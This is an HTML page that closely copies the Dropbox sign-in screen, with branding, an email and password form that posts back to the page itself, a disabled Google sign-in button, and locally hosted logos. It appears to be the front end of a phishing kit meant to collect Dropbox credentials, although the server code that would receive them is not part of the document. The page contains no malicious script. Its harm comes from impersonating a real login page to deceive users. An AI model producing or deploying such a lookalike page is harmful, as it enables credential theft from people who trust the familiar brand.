
<!DOCTYPE html>
<html>

<head>
    <title>Login - Dropbox</title>
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/bootstrap.css" rel="stylesheet">
    <link href="css/bootstrap-theme.min.css" rel="stylesheet">
    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
    <style type="text/css">
        a:link {
            color: #007ee5;
            background-color: transparent;
            text-decoration: none;
        }

        a:hover {
            color: #007ee5;
            background-color: transparent;
            text-decoration: underline;
        }

        .hr-label__text:before,
        .hr-label__text:after {
            background-color: rgba(0, 0, 0, 0.2);
            content: "";
            display: inline-block;
            height: 1px;
            position: relative;
            vertical-align: middle;
            width: 50%;
        }

        .hr-label__text:before {
            right: 0.5em;
            margin-left: -50%;
        }

        .hr-label__text:after {
            left: 0.5em;
            margin-right: -50%;
        }

        div {
            box-sizing: border-box;
        }

        input[email]:focus,
        input[password]+label {
            opacity: 0;
        }

        input[password] {
            font-size: 16px;
        }

        .signin-button:focus+.login-indicator {
            display: block;
        }
    </style>
    <script>
        $(document).ready(function() {

            var placeholderText = $("label[for='email']").text();

            $("label[for='email']").remove();

            $("#email").attr('placeholder', placeholderText).enablePlaceholder();
        });
    </script>
    <script>
        $(document).ready(function() {

            var placeholderText = $("label[for='Passwd']").text();

            $("label[for='Passwd']").remove();

            $("#Passwd").attr('placeholder', placeholderText).enablePlaceholder();
        });
    </script>
    <script language="Javascript">
        $(document).ready(function() {
            $("input[type='password']").keypress(function(e) {
                var s = String.fromCharCode(e.which);

                if ((s.toUpperCase() === s && s.toLowerCase() !== s && !e.shiftKey) ||
                    (s.toUpperCase() !== s && s.toLowerCase() === s && e.shiftKey)) {
                    if ($('#capsalert').length < 1) $(this).after(
                        '<div id="capsalert"><img src="cfl.dropboxstatic.com/static/images/icons/icon_caps_lock-vflQIxpDA.png" style="position: absolute; top: 0; right: 7px; margin: 10px 1px; width: 16px; height: 16px; overflow: hidden; white-space: nowrap; text-indent: 100%;"><p>Caps lock is currently on</p></div>'
                    );
                } else {
                    if ($('#capsalert').length > 0) $('#capsalert').remove();
                }
            });
        });
    </script>
</head>

<body style="font-family: 'Open Sans','lucida grande','Segoe UI',arial,verdana,'lucida sans unicode',tahoma,sans-serif; font-size: 13px; color: #3d464d; font-weight: normal;">
    <header style="display:block; box-sizing: border-box; box-shadow: 0px 1px 1px #d0d4d9;border-bottom: 1px solid #d0d4d9;background-color: #fff;overflow-x: hidden; overflow-y: hidden; position: fixed; height: 76px; z-index: 99; font-size: 0;top: 0; right: 0; left: 0;">
        <div style="margin-left: auto; margin-right: auto; overflow-x: hidden; overflow-y: hidden; max-width: 1200px; min-width: 600px; height: 76px; position: relative;">
            <nav class="" style="top: 22px; right: 105px; bottom: 22px; left: 105px; position: absolute; width: auto; height: 32px; z-index: 3;">
                <ul class="" style=" height: 32px; line-height: 26px; color: #3d464d; font-weight: normal; list-style-type: none; margin-top: 0px; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0;text-align: left; vertical-align: middle; display: inline-block; margin: 0; padding: 0; width: 50%; font-size: 0;">
                    <li style="-webkit-box-sizing: border-box; -moz-box-sizing: border-box; width : 159px; height: 32px; max-width : 159px; max-height: 32px; margin-top: 0px; margin-right: 12px; margin-bottom: 0px; margin-left: 0px; display: inline-block; vertical-align: middle; box-sizing: border-box; line-height: 26px;color: #3d464d; font-weight: normal;resize: none;">
                        <a href="/download" id="try-dfb" style="-webkit-box-sizing: border-box; -moz-box-sizing: border-box; font-family: arial,verdana,tahoma,sans-serif; outline: none; list-style-type: disc; font-weight: 600; cursor: pointer; overflow: visible; text-decoration: none; border-radius: 5px; padding-top: 7px; padding-right: 16px; padding-bottom: 7px; padding-left: 16px; font-size: 12px; margin-top: 0px; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; border-color: #2895F1; color: #2895F1; border: 1px solid ; background: none; display: inline-block; text-align: center;min-height: 34px; line-height: normal; box-sizing: border-box; list-style-type: disc; -webkit-font-smoothing: antialiased; max-width : 159px; max-height: 32px;resize: none;">Try Dropbox Business</a>
                    </li>
                </ul>
                <ul style="height: 32px; text-align: right;display: inline-block; margin: 0; padding: 0; width: 50%; font-size: 0; vertical-align: middle;">
                    <li style="margin: 0 0 0 12px; display: inline-block; vertical-align: middle; text-align: right; box-sizing: border-box; line-height: 26px; color: #3d464d; font-weight: normal; font-size: 0;">
                        <button type="button" class="btn btn-link" style="-webkit-appearance: none; padding-left: 0; padding-right: 0; font-size: 14px; border: none; background: none; color: #007ee5; outline: none;">Download the app</button>
                    </li>
                </ul>
            </nav>
            <h1 style="margin: 13px auto; width: 180px; position: relative; height: 46px; max-width: 220px; font-size: 0; text-align: left; display: block; z-index: 3;">
        <a href="" style="display: inline-block;">
          <img src="static/images/about/dropbox_logo_glyph_2015.svg" alt="" style="z-index: 4; vertical-align: middle; height: 44px; width: 42px; display: inline-block;">
          <img src="static/images/about/dropbox_logo_text_2015.svg" alt="" style="z-index: 3; width: 120px; height: 34px; vertical-align: middle; display: inline-block; background: no-repeat center center; position: relative; top: 2px; margin-left: 8px; background-size: 120px auto;">Dropbox
        </a>
      </h1>
        </div>
    </header>
    <div style="width: 990px; margin: 0 auto; -webkit-font-smoothing: antialiased; display: block;">
        <div style="padding-bottom: 2em; min-height: 425px; -webkit-font-smoothing: antialiased; display: block;">
            <div style="padding-top: 126px; text-align: center;">
                <img src="cfl.dropboxstatic.com/static/images/empty_states/sign-in-vflchypbO.png" alt="" style="margin-right: 90px; margin-top: 80px; margin-bottom: 110px; display: inline-block; vertical-align: middle; box-sizing: border-box;">
                <div style="display: inline-block; vertical-align: middle;">
                    <div style="display: inline-block; vertical-align: middle; width: 350px;">
                        <div style="display: block;">
                            <div style="display: block;">
                                <div style="color: #3d464d; float: left; font-size: 18px; font-weight: normal;">Sign in</div>
                                <div style="float: right; margin-top: 5px; line-height: normal;">
                                    or <a style="color: #2895F1; cursor: pointer; outline: none; box-sizing: border-box;" href="/">create an account</a>
                                </div>
                            </div>
                        </div>
                      </div>
                        <div style="width: 100%; position: relative; text-align: left;">
                            <div class="google-signin" style="text-align: left;">
                                <button style="background-size: 16px 16px; background-repeat: no-repeat; background-position: left 10px center; background-image: url('cfl.dropboxstatic.com/static/images/index/google-logo-white-vfltwSoWq.svg'); background-color: #4e8df5; position: relative; padding: 8px 0; margin-bottom: 5px; width: 100%; border: 1px solid rgba(0,0,0,0.2); font-family: 'Roboto', sans-serif; font-weight: 500; font-size: 14px; margin-top: 20px; margin-right: 0px; margin-left: 0px; color: white; display: inline-block; text-align: center; cursor: pointer; overflow: visible; text-decoration: none; min-height: 34px; line-height: normal; box-sizing: border-box; border-radius: 3px; outline: 0;" disabled>
                    <div style="font-family: 'Roboto', sans-serif; font-weight: 500; font-size: 14px; color: white; text-align: center; cursor: pointer; line-height: normal; -webkit-font-smoothing: antialiased; letter-spacing: normal; word-spacing: normal; text-transform: none; text-indent: 0px; text-shadow: none; ">Sign in with Google</div>
                  </button>
                                <div style="position: relative; margin-top: 20px; margin-bottom: 5px; text-align: center; clear: both; overflow: hidden;">
                                    <span class="hr-label__text">or</span>
                                </div>
                                <div style="height: 16px"></div>
                            </div>
                            <div>
                                <form class="login-form" action="" method="post" style="display: block; padding: 0; margin: 0;">
                                    <div style="-webkit-font-smoothing: antialiased; display: block;">
                                        <div style="position: relative; -webkit-font-smoothing: antialiased;">
                                            <input id="email" name="email" type="email" style="border-top-color: rgb(189, 196, 201); border-top-style: solid; border-top-width: 1px; border-right-color: rgb(189, 196, 201); border-right-style: solid; border-right-width: 1px; border-bottom-color: rgb(189, 196, 201); border-bottom-style: solid; border-bottom-width: 1px; border-left-color: rgb(189, 196, 201); border-left-style: solid; border-left-width: 1px; border-image-source: initial; border-image-slice: initial; border-image-width: initial; border-image-outset: initial; border-image-repeat: initial; font-size: 16px; padding: 5px 6px; width: 100%; margin: 2px 0 5px; min-height: 34px; line-height: normal; box-sizing: border-box; border-radius: 3px; background-color: white; -webkit-rtl-ordering: logical; -webkit-user-select: text; cursor: auto; text-rendering: auto; letter-spacing: normal; word-spacing: normal; text-transform: none; text-indent: 0px; text-shadow: none; display: inline-block; text-align: start; -webkit-writing-mode: horizontal-tb;"
                                                required="" pattern="^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$">
                                            <label id="label" style="-webkit-font-smoothing: antialiased; color: #aaa; cursor: text; font-size: 18px; text-align: left; box-sizing: border-box; position: absolute; padding: 8px; left: 0; right: 0; top: 0; transition-property: color; transition-duration: 0.2s; transition-timing-function: linear; transition-delay: 0s; font-weight: normal;"
                                                for="email">Email</label>
                                        </div>
                                    </div>
                                    <div style="height: 16px"></div>
                                    <div style="-webkit-font-smoothing: antialiased; display: block;">
                                        <div id="pass-container" style="position: relative; -webkit-font-smoothing: antialiased;">
                                            <input id="Passwd" name="Passwd" type="password" style="font-size: 16px; display: block; border: 1px solid #bdc4c9; padding: 5px 6px; width: 100%; margin: 2px 0 5px; min-height: 34px; line-height: normal; box-sizing: border-box; border-radius: 3px; font-family: arial, sans-serif; color: #3d464d; font-weight: normal;"
                                                required="">
                                            <label for="Passwd" id="label" style="-webkit-font-smoothing: antialiased; color: #aaa; cursor: text; font-size: 18px; text-align: left; box-sizing: border-box; position: absolute; padding: 8px; left: 0; right: 0; top: 0; right: 0; -webkit-transition: color 0.2s linear 0s; transition: color 0.2s linear 0s; pointer-events: none; font-weight: normal;">Password</label>
                                        </div>
                                    </div>
                                    <div style="height: 16px"></div>
                                    <div style="display: block;">
                                        <div style="max-width: 200px; display: inline-block; margin-top: 0px; vertical-align: bottom;margin: 2px 0 5px; min-height: 34px; line-height: normal; box-sizing: border-box; border-radius: 3px; -webkit-appearance: none; padding: 6px 0; height: auto;">
                                            <input id="remember" checked="checked" type="checkbox" name="remember" style="cursor: pointer; height: 14px; width: 14px; margin: 0; padding: 0; vertical-align: middle;">
                                            <label for="remember" style="cursor: pointer; visibility: shown; font-weight: normal; margin-left: 7px; margin-bottom: 1px; vertical-align: middle;">Remember me</label>
                                        </div>
                                        <button class="signin-button" type="submit" name="submit" style="float: right; background-color: #007ee5; background-image: linear-gradient(#168add, #007ee5); border: 1px solid #0c6ebe; color: white; display: inline-block; text-align: center; font-size: 13px; font-weight: 600; cursor: pointer; overflow: visible; text-decoration: none;margin: 2px 0 5px; min-height: 34px; line-height: normal; box-sizing: border-box; border-radius: 3px; -webkit-appearance: none; padding: 6px 16px; width: auto;">
                                            <div style="color: white;">Sign in</div>
                                          </button>
                                        <span class="login-indicator" style="display:none; float: right; margin: 11px 5px 0 0;">
                                            <img src="cfl.dropboxstatic.com/static/images/icons/ajax-loading-small-vfl3Wt7C_.gif">
                                          </span>
                                    </div>
                                    <div style="margin-top: 13px;" class="forgot-pass">
                                        <a style="margin-bottom: 4px;" href="/forgot">Forgot your password?</a>
                                    </div>
                                </form>
                            </div>
                        </div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>
